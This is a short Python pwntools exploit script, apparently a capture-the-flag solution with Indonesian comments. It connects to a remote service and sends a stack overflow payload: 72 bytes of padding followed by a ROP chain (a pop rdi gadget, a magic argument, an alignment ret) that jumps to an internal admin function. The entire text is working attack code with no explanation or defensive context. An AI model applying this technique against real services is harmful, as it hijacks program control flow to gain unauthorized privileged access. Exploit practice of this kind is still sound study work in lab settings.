from pwn import *
context.arch = 'amd64'

p = remote('10.34.9.91', 10084)

POP_RDI = 0x4011ec
RET = 0x401375          # alamat 'ret' polos, ambil dari akhir handle_set_note
INTERNAL_ADMIN = 0x4011f1

payload  = b'A' * 72
payload += p64(POP_RDI)
payload += p64(0x1337c0de)
payload += p64(RET)              # <-- extra ret buat fix alignment
payload += p64(INTERNAL_ADMIN)

p.send(b'\x01')
p.send(p16(len(payload)))
p.send(payload)

print(p.recvall(timeout=5).decode(errors='ignore'))
